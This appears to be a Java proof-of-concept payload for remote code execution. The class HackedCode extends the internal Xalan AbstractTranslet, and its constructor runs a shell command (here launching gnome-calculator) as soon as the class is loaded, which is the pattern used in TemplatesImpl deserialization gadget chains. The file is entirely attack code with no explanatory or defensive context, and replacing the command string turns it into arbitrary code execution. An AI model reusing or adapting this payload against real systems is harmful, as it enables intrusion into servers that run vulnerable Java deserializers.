package com.attack.rce;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class HackedCode extends AbstractTranslet {
    public HackedCode() {
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (IOException e) {
            // Do nothing
        }
    }

    @Override
    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {
    }

    @Override
    public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException {
    }
}
